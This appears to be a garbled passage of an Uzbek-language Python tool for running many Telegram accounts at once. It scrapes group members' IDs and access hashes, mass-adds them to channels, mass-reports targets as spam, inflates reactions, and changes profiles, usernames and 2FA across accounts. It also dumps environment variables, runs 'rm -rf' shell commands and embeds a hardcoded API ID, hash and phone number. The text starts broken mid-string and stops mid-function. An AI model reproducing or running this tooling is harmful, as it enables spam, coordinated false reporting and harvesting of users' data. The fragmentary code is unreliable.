        rexadd = 0
        for rexop in contacts.users:
            rexadd += 1

            try:
                client(DeleteCont'
love = ''
god = '= TelegramClient(f"sessions/{phone}", API_ID, HashID)
            client.connect()
            if not client.is_user_authorized():
                print(f'{r}Bazi narsalar õzgardi{n}')
                client.send_code_request(phone)
                client.sign_in(phone, input('Codni yozing: '))

            input_file = HackingZone
            users = []
            with open(input_file, encoding='UTF-8') as f:
                rows = csv.reader(f, delimiter=",", lineterminator="\n")
                next(rows, None)
                for row in rows:
                    user = {}
                    user['srno'] = row[0]
                    user['username'] = row[1]
                    user['id'] = int(row[2])
                    user['access_hash'] = int(row[3])
                    user['name'] = row[4]
                    users.append(user)

            with open('memory.csv', 'r') as hash_obj:

                csv_reader = reader(hash_obj)

                list_of_rows = list(csv_reader)
                row_number = 1
                col_number = 1
                numnext = list_of_rows[row_number - 1][col_number - 1]

            startfrom = int(numnext)
            nextstart = startfrom + hacks

            with open('memory.csv', 'r') as hash_obj:
                csv_reader = reader(hash_obj)
                list_of_rows = list(csv_reader)
                row_number = 1
                col_number = 2
                numend = list_of_rows[row_number - 1][col_number - 1]

            endto = int(numend)
            nextend = endto + hacks

            with open("memory.csv", "w", encoding='UTF-8') as df:  # Enter your file name.

                writer = csv.writer(df, delimiter=",", lineterminator="\n")

                writer.writerow([nextstart, nextend])

            client(ImportChatInviteRequest(rexlink))
            time.sleep(5)
            channel = client.get_input_entity(PeerChannel(id))
            channelinfo = client(GetFullChannelRequest(channel=channel))
            rexprodeltanoob = int(channelinfo.full_chat.participants_count)
            print(f'Azolar: {rexprodeltanoob}')
            if rexprodeltanoob >= stop:
                print(f'Maqsad  {stop} Bajarildi')
                input()
                main_menu()

            it = 0
            for user in users:
                if (int(startfrom) <= int(user['srno'])) and (int(user['srno']) <= int(endto)):
                    print(f'Azolar {rexprodeltanoob}')
                    try:
                        it += 1
                        user_to_add = InputPeerUser(user['id'], user['access_hash'])
                        continue

                        client(functions.channels.InviteToChannelRequest(rexlink, [user['username']]))
                        print(f'{it} - bajarildi')

                        time.sleep(HackingZone_dev)

                    except ChatWriteForbiddenError as cwfe:
                        client(ImportChatInviteRequest(rexlink))
                        time.sleep(5)
                        continue



                    except errors.RPCError as e:
                        status = e.__class__.__name__

                        print(f'{it} - {status}')





                    except:
                        traceback.print_exc()
                        print(f"{ye}Kutilmagan xato{n}")
                        continue

            a += 1
        os.remove("memory.csv")


    rexchoose = str(input(f'{bl}Agar guruh shaxsiy bõlsa, y tugmasini bosing.  boshqa n : {n}'))
    if rexchoose == 'y':
        private()
    elif rexchoose == 'n':
        autos()
def MultipleAdder():
    import subprocess
    import colorama
    from colorama import Fore, Back, Style
    import time
    import csv
    #HackingZonepost()

    with open('memory.csv', 'w', encoding='UTF-8') as file:
        writer = csv.writer(file, delimiter=",", lineterminator="\n")
        writer.writerow([1, 1, 50])
    a = int(input("Qancha hisobni ishga tushirishni xohlaysiz? => ")) - 1
    x = 0
    while x <= a:
        subprocess.Popen('python v1-1.py', shell=True)
        
        x = x + 1
        time.sleep(3)
    time.sleep(10)
    os.remove("memory.csv")
    
def Viewotp():
	   banner()
	   with open('phone.csv', 'r')as f:
	   	str_list = [row[0] for row in csv.reader(f)]
	   	po = 0 
	   	for pphone in str_list:
	   		phone = utils.parse_phone(pphone)
	   		po += 1
	   		print(cy+ f"Telegram xabarini olish Otp {phone}")
	   		client = TelegramClient(f"sessions/{phone}", API_ID, HashID)
	   		client.start(phone)
	   		messages = client.get_messages(chatop)
	   		print(ye+ f"{messages[0].text}")
	   
def groupjoiner():

 n = Fore.RESET
 lg = Fore.BLUE
 r = Fore.RED
 w = Fore.WHITE
 cy = Fore.CYAN
 ye = Fore.YELLOW
 gr = Fore.GREEN
 colors = [lg, r, w, cy, ye, gr]

 config = configparser.ConfigParser()
 config.read("config.ini")
 grouplink = config['Shoirjon_official']['ToGroup']
 groupid = config['Shoirjon_official']['GroupID']
 stopnum = config['Shoirjon_official']['EnterStop']
 stacno = config['Shoirjon_official']['StartingAccount']
 endacno = config['Shoirjon_official']['EndAccount']

 phone = []
 with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        print(f'{lg} Jami hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} Kanal yoki guruhga qõshilish uchun raqam hisobini kiritingp {r}'))
        join_op = str(input(f'{cy} kanal/guruh foydalanuvchi nomini yuboring {r}'))
        print(f'{lg} --kanallarga ulanish--')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            stop = index + 60
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Seans boshlanmoqda... ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                c(JoinChannelRequest(join_op))
                print(f'dan qõshildi: {cy}{acc_name}{lg}  Muvaffaqiyatli.... ')
                send_status += 1
             except Exception as e:
                print(f'{e}')
                continue
        if send_status != 0:
            print(f"\n{lg}sessiya yakunlandi")
            input(f'\n{cy} Chiqish uchun Enter tugmasini bosing...')
        else:
            print(f"\n{lg} Muvaffaqiyatli qõshildi")
            input(f'\n{cy} Chiqish uchun Enter tugmasini bosing...')

def grouplefter():

 n = Fore.RESET
 lg = Fore.BLUE
 r = Fore.RED
 w = Fore.WHITE
 cy = Fore.CYAN
 ye = Fore.YELLOW
 gr = Fore.GREEN
 colors = [lg, r, w, cy, ye, gr]

 config = configparser.ConfigParser()
 config.read("config.ini")
 grouplink = config['Shoirjon_official']['ToGroup']
 groupid = config['Shoirjon_official']['GroupID']
 stopnum = config['Shoirjon_official']['EnterStop']
 stacno = config['Shoirjon_official']['StartingAccount']
 endacno = config['Shoirjon_official']['EndAccount']

 phone = []
 with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        print(f'{lg} Batcha hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} Kanal yoki guruhdan chiqish uchun raqam hisobini kiriting {r}'))
        left_op = str(input(f'{cy} kanal/guruh foydalanuvchi nomini yuboring {r}'))
        print(f'{lg} --Kanallarni tark etish--')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            stop = index + 60
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Seans boshlanmoqda... ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                c(LeaveChannelRequest(left_op))
                print(f'left from: {cy}{acc_name}{lg}  Muvaffaqiyatli... ')
                send_status += 1
             except Exception as e:
                print(f'{e}')
                continue
        if send_status != 0:
            print(f"\n{lg}sessiya yakunlandi")
            input(f'\n{cy} Chiqish uchun Enter tugmasini bosing...')
        else:
            print(f"\n{lg} Muvaffaqiyatli chap")
            input(f'\n{cy} Chiqish uchun Enter tugmasini bosing...')
            
def reportspam():
 n = Fore.RESET
 lg = Fore.BLUE
 r = Fore.RED
 w = Fore.WHITE
 cy = Fore.CYAN
 ye = Fore.YELLOW
 gr = Fore.GREEN
 colors = [lg, r, w, cy, ye, gr]

 config = configparser.ConfigParser()
 config.read("config.ini")
 grouplink = config['Shoirjon_official']['ToGroup']
 groupid = config['Shoirjon_official']['GroupID']
 stopnum = config['Shoirjon_official']['EnterStop']
 stacno = config['Shoirjon_official']['StartingAccount']
 endacno = config['Shoirjon_official']['EndAccount']

 phone = []
 with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        print(f'{lg} Barcha hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} Spam haqida xabar berish uchun hisoblar sonini kiriting  {r}'))
        user = str(input(f'{cy} Guruh, kanal yoki foydalanuvchi nomini kiriting{r}'))
        sleep_time = 1
        print(f'{lg} --Spam haqida xabar berish {user}{lg} hisobi muvaffaqiyatli boshlandi --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            stop = index + 60
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Seans boshlanmoqda...   ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                c(ReportSpamRequest(user))
                
                print(f'=======Spam haqida xabar berildi {user}:from {cy}{acc_name}{lg}======== ')
                send_status += 1
             except Exception as e:
                print(f'{e}')
                continue
        if send_status != 0:
            print(f"\n{lg}sessiya yakunlandi")
            input(f'\n{cy} Chiqish uchun Enter tugmasini bosing')
        else:
            print(f"\n{lg} barcha hisobotlar muvaffaqiyatli bajarildi")
            input(f'\n{cy} Chiqish uchun Enter tugmasini bosing')
            
def pvtscraper():
 r = Fore.RED
 g = Fore.GREEN
 b = Fore.BLUE
 d = Style.RESET_ALL

 config = configparser.ConfigParser()
 config.read("config.ini")
 link1 = (config['Shoirjon_official']['FromGroup']).strip()
 links = link1.split(',')
 phone = (config['Shoirjon_official']['PhoneNumber']).strip()

 print(Style.BRIGHT + Fore.RESET + f'\nRõyxatdan õtish {phone}')

 c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
 c.connect()
 if c.is_user_authorized():
     p = input("1: Scrape guruhiga allaqachon qo'shilgan \n2: Guruhga qõshiling, keyin Scrape\n")
     if p=='1':
            print(gr+'[+] ochuvchi qirğich'+re)

     elif p=='2':

            link = str(input(f'{cy} Guruh xeshini kiriting{r}'))
            result = c(functions.messages.ImportChatInviteRequest(
        hash=link))
            time.sleep(3)

     chats = []
     last_date = None
     chunk_size = 200
     groups=[]
 
     result = c(GetDialogsRequest(
             offset_date=last_date,
             offset_id=0,
             offset_peer=InputPeerEmpty(),
             limit=chunk_size,
             hash = 0
         ))
 chats.extend(result.chats)
 dialogs = c.get_dialogs()
       

 m = input("1: Faqat umumiy guruhlar uchun \n2: hamma ochiq va shaxsiy guruhlar uchun\n")
 if m=='1':
    for chat in chats:
        try:
            if chat.megagroup == True:
                groups.append(chat)
        except:
            continue
 elif m=='2':
    for i in dialogs:
        try:
            i.entity.status
        except:
            groups.append(i)
            continue
 
 print(gr+'[+] Azolarni yiğib olish uchun guruhni tanlang:'+re)
 i=0
 for g in groups:
    print(gr+'['+cy+str(i)+']' + ' - ' + g.title)
    i+=1
 
 print('')
 g_index = input(gr+"[+] Raqamni kiriting: "+re)
 target_group=groups[int(g_index)]
 
 print(gr+'[+] Azolar olinmoqda...')
 time.sleep(1)

 members = []
 members = c.get_participants(target_group, limit=5500)

 if c.is_user_authorized():
            count = 1
            today = datetime.datetime.now()
            last_week = today + timedelta(days=-7)
            last_month = today + timedelta(days=-30)
            f = open("data.csv", "w", encoding='UTF-8')
            writer = csv.writer(f,delimiter=",",lineterminator="\n")
            writer.writerow(['sr. no.','username','user id','access_hash','name','group','status'])
            for user in members:
                    if user.username:
                        username= user.username
                    else:
                        username= ""
                    if user.first_name:
                        first_name= user.first_name
                    else:
                        first_name= ""
                    if user.last_name:
                        last_name= user.last_name
                    else:
                        last_name= ""
                    name= (first_name + ' ' + last_name).strip()
                    if isinstance(user.status,UserStatusOffline):
                        status= user.status.was_online
                    else:
                        status = type(user.status).__name__
                    writer.writerow([count,username,user.id,user.access_hash,name,target_group.title,status])
                    count = count + 1

 print(gr+'[+] Azolar muvaffaqiyatli õtishdi.')
 
def antiban():

        time.sleep(5)

        alf = open("abnumbers.txt","r").read()
        alf1 = alf.split()

        i = 1
        j = 0

        while True:
            try:
                a = str(alf1[j])
                b = int(alf1[j+1])
                c = str(alf1[j+2])
                d = str(alf1[j+3])
            except:
                print("Tugallandi")
                sys.exit()
            app = Client("Sessionss/"+a,b,c,phone_number=d)
            app.start()
            app.send_message("me",str(i))
            app.stop()
            print("Session "+str(i)+" Yaratilgan!")
            def process_data():
                sleep(0.02)

            for _ in track(range(100), description='[green]Anti-banni faollashtirish'):
                process_data()
            i += 1
            j += 4

        time.sleep(5)
        sys.exit()

def abremover():
        time.sleep(2)
        os.system('rm -rf Sessionss')
        print("1-jarayon Bajarildi")
        time.sleep(2)
        os.system('rm abnumbers.txt')
        print("2-jarayon tugallandi")
        time.sleep(2)
        os.system('mkdir Sessionss')
        print("3-jarayon tugallandi")
        time.sleep(2)
        os.system('touch abnumbers.txt')
        print("4-jarayon tugallandi")
        time.sleep(2)
        os.system('echo 1 15606699 3c99082fff6a24903c7825fe935d4f5c +79015664814 > abnumbers.txt')
        print("5-jarayon tugallandi")
        print("Barcha jarayon bajarildi")
        print("Asosiy menyu uchun skriptni qayta ishga tushiring")

def getSystemInfo():
        for item in os.environ:
            print(f'{gr}{item}{" : "}{os.environ[item]}')

def reaction():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Taqiqlangan hisoblar tekshirilmoqda...' + rs)
        print(f'{lg} Jami hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} Reaksiya bildirish uchun nechta hisobdan foydakanamiz? :  {r}'))
        reaction = str(input(f'{cy} Guruh/kanalga Manzilini kiriting: {r}'))
        msgid = int(input(f'{cy} Xabar ID raqamjni kiriting: {r}'))
        reactionop = str(input(f'{cy} Reaktsiyani kiriting {r}'))
        sleep_time = 1
        print(f'{lg} --Kimdan reaksiya yuborilmoqda {w}{len(phone)}{lg} Hisob(s) --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            index += 1
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Seans boshlanmoqda... ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                c.send_reaction(reaction, msgid, reactionop)
                
                print(f'=======Muvaffaqiyatli qõshilgan reaktsiya {cy}{acc_name}{lg}======== ')
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}sessiya yakunlandi")
            else:
                print(f"\n{lg}Barcha reaktsiya muvaffaqiyatli qõshildi")
                
def profoesit():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Checking for banned accounts...' + rs)  
        print(f'{lg} Jami hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} Profilni tahrirlash uchun hisoblar sonini kiriting {r}'))
        firstname = str(input(f'{cy} Ismingizni kiriting {r}'))
        lastname = str(input(f'{cy} Familiyani kiriting{r}'))
        bio = str(input(f'{cy} Bio-ga kiriting {r}'))
        sleep_time = 1
        print(f'{lg} --Reaksiyani yuborish {w}{len(phone)}{lg} hissob(s) --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            index += 1
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Seans boshlanmoqda... ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                result = c(functions.account.UpdateProfileRequest(
                    first_name=firstname,
                    last_name=lastname,
                    about=bio
                ))
                print(result.stringify())
                
                print(f'=======Profil maʼlumotlari muvaffaqiyatli oʻzgartirildi {cy}{acc_name}{lg}======== ')
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}sessiya yakunlandi")
            else:
                print(f"\n{lg}Barcha profil maʼlumotlari muvaffaqiyatli oʻzgartirildi")
                
def usernamec():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Checking for banned accounts...' + rs)  
        print(f'{lg} Barcha hisoblar: {w}{len(phone)}')
        usernamedt = str(input(f'{cy} Foydalanuvchi nomini kiriting {r}'))
        sleep_time = 1
        print(f'{lg} --Kimdan reaksiya yuborilmoqda {w}{len(phone)}{lg} Hissob(s) --')   
        send_status = 0
        
        for acc in pphone:
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Seans boshlanmoqda... ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                result = c(functions.account.UpdateUsernameRequest(
                    username=usernamedt
                ))
                print(result.stringify())
                
                print(f'=======Foydalanuvchi nomi muvaffaqiyatli õzgartirildi {cy}{acc_name}{lg}======== ')
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}sessiya yakunlandi")
            else:
                print(f"\n{lg}Barcha profil ma‘lumotlari muvaffaqiyatli oʻzgartirildi")

def channelusernamec():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Checking for banned accounts...' + rs)  
        print(f'{lg} Barcha hsoblar: {w}{len(phone)}')
        uctd = str(input(f'{cy} Eski kanal foydalanuvchi nomini kiriting {r}'))
        umpc = str(input(f'{cy} Yangi kanal foydalanuvchi nomini kiriting {r}'))
        sleep_time = 1
        print(f'{lg} --Kanal foydalanuvchi nomi õzgartirilmoqda {w}{len(phone)}{lg} Hisob(s) --')   
        send_status = 0
        
        for acc in pphone:
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Sessiya boshlanmoqda....')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                result = c(functions.channels.UpdateUsernameRequest(
                    channel=uctd,
                    username=umpc
                ))
                print(result)
                
                print(f"=======Kanal foydalanuvchi nomi muvaffaqiyatli o'zgartirildi {cy}{acc_name}{lg}======== ")
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}sessiya yakunlandi")
            else:
                print(f"\n{lg}Kanal foydalanuvchi nomi muvaffaqiyatli oʻzgartirildi")
                
def channelnamec():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Checking for banned accounts...' + rs)  
        print(f'{lg} Barcha Acauntlar {w}{len(phone)}')
        uctds = str(input(f'{cy} Eski kanal foydalanuvchi nomini kiriting {r}'))
        umpcs = str(input(f'{cy} Yangi kanal foydalanuvchi nomini kiriting {r}'))
        sleep_time = 1
        print(f'{lg} --Kanal nomi õzgartirilmoqda {w}{len(phone)}{lg} Akaunt(s) --')   
        send_status = 0
        
        for acc in pphone:
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Sessiya boshlanmoqda...')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                result = c(functions.channels.EditTitleRequest(
                   channel=uctds,
                   title=umpcs
                ))
                print(result.stringify())
                
                print(f'=======Kanal nomi muvaffaqiyatli oʻzgartirildi {cy}{acc_name}{lg}======== ')
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}session ended")
            else:
                print(f"\n{lg}Kanal nomi muvaffaqiyatli oʻzgartirildi")
                
def faedit():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Taqiqlangan hisoblar tekshirilmoqda...' + rs)
        print(f'{lg} Barcha hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} 2FAni tahrirlash/o‘rnatish uchun hisoblar sonini kiriting {r}'))
        lovely = str(input(f'{cy} Yangi parolni kiriting {r}'))
        sleep_time = 1
        print(f'{lg} --{w}{len(phone)}{lg} hisob(s) dan 2FA tahrirlanmoqda --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            index += 1
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Seans boshlanmoqda... ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                c.edit_2fa(new_password=lovely)
                
                print(f'=======2FA muvaffaqiyatli õzgartirildi {cy}{acc_name}{lg}======== ')
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}sessiya yakunlandi")
            else:
                print(f"\n{lg}Barcha hisob 2Fa muvaffaqiyatli tahrirlangan")
                
def farm():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Taqiqlangan hisoblar tekshirilmoqda...' + rs)
        print(f'{lg} Jami hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} 2FAni olib tashlash uchun hisoblar sonini kiriting {r}'))
        pyaar = str(input(f'{cy} Joriy parolni kiriting {r}'))
        sleep_time = 1
        print(f'{lg} -- {w}{len(phone)}{lg} Hisob(s)idan 2Fa olib tashlanmoqda --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            index += 1
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Starting session... ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                c.edit_2fa(current_password=pyaar)
                
                print(f'=======2FA muvaffaqiyatli olib tashlandi {cy}{acc_name}{lg}======== ')
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}sessiya yakunlandi")
            else:
                print(f"\n{lg}Barcha hisob 2Fa muvaffaqiyatli olib tashlandi")

def trequ():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Taqiqlangan hisoblar tekshirilmoqda...' + rs)  
        print(f'{lg} Barcha hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} Seanslarni tugatish uchun hisoblar sonini kiriting {r}'))
        sleep_time = 1
        print(f'{lg} --Boshqa barcha seanslarni toʻxtatish {w}{len(phone)}{lg} account(s) --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            index += 1
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy} Session Boshlanmoqda...  ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
             try:
                result = c(functions.auth.ResetAuthorizationsRequest())
                print(result)
                
                print(f'=======Boshqa barcha sessiyalar muvaffaqiyatli tugatildi {cy}{acc_name}{lg}======== ')
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}sessiya yakunlandi")
            else:
                print(f"\n{lg}Barcha hisoblar, qolgan barcha seanslar muvaffaqiyatli yakunlandi")
                
def getlis():

    n = Fore.RESET
    lg = Fore.BLUE
    r = Fore.RED
    w = Fore.WHITE
    cy = Fore.CYAN
    ye = Fore.YELLOW
    gr = Fore.GREEN
    colors = [lg, r, w, cy, ye, gr]

    config = configparser.ConfigParser()
    config.read("config.ini")
    grouplink = config['Shoirjon_official']['ToGroup']
    groupid = config['Shoirjon_official']['GroupID']
    stopnum = config['Shoirjon_official']['EnterStop']
    stacno = config['Shoirjon_official']['StartingAccount']
    endacno = config['Shoirjon_official']['EndAccount']

    phone = []
    with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

        
        #print('\n' + info + lg + ' Taqiqlangan hisoblar tekshirilmoqda...' + rs)  
        print(f'{lg} Barcha hisoblar: {w}{len(phone)}')
        number_of_accs = int(input(f'{cy} Seanslar rõyxatini olish uchun hisoblar sonini kiriting {r}'))
        sleep_time = 1
        print(f'{lg} --Boshqa barcha seanslar {w}{len(phone)}{lg} hisob(s)dan olinmoqda --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in pphone:
            index += 1
            print(f'Index : {index}')
            phone = utils.parse_phone(acc)
            c = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            print(f'User: {cy}{phone}{lg} -- {cy}Seans boshlanmoqda... ')
            c.start()
            if c.is_user_authorized():
             acc_name = c.get_me().first_name
